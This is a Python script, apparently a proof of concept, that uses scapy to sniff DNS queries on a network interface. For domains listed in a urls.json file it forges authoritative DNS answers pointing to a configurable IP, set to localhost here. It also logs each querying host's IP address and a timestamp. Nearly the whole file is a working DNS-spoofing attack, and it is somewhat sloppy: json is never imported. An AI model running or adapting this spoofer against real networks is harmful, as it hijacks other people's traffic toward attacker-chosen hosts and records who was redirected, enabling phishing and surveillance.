from scapy.all import * #type:ignore
from pathlib import Path
from data.data_helper import record_entry

import time


# Configuration
def load_urls() -> dict[str,str]:
    try:
        with open(f'{Path(__file__).parent}/urls.json', 'r') as file:
            return json.load(file)
    except Exception as e:
        return {}
    
URLS: dict[str,str] = load_urls()
SPOOF_IP = "127.0.0.1"        # IP to redirect to (localhost for PoC)
INTERFACE = "en1"             # Your network interface (check with `ifconfig`)

def dns_spoof(pkt):
    # Check if packet is a DNS query
    #print("Found packets")req info working full
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:#type:ignore
        #print("Found dns packets")
        qname = pkt[DNSQR].qname.decode().rstrip(".")#type:ignore
        if qname in URLS.keys():
            #print(f"Intercepted DNS query for {qname}")

            # Craft spoofed DNS response
            spoofed_pkt = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /#type:ignore
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /#type:ignore
                DNS(#type:ignore
                    id=pkt[DNS].id,  # Match query ID#type:ignore
                    qr=1,            # Response flag
                    aa=1,            # Authoritative answer
                    qd=pkt[DNS].qd,  # Copy query section#type:ignore
                    an=DNSRR(rrname=qname, type="A", ttl=300, rdata=SPOOF_IP)#type:ignore
                )
            )

            # Send spoofed response
            for _ in range(5):
                sendp(spoofed_pkt, verbose=0)
                time.sleep(0.1)
            print(f"Spoofed DNS response sent: {qname} -> {SPOOF_IP}")
            record_entry(qname,build_dict_from_packet(pkt))
            
def build_dict_from_packet(pkt) -> dict[str,str]:
    return {"IP":pkt[IP].src,"Time":time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}



if __name__ == "__main__":
    # Sniff DNS packets
    print(f"Sniffing DNS queries for {URLS.keys()} on {INTERFACE}...")
    sniff(filter="udp port 53", prn=dns_spoof, store=0)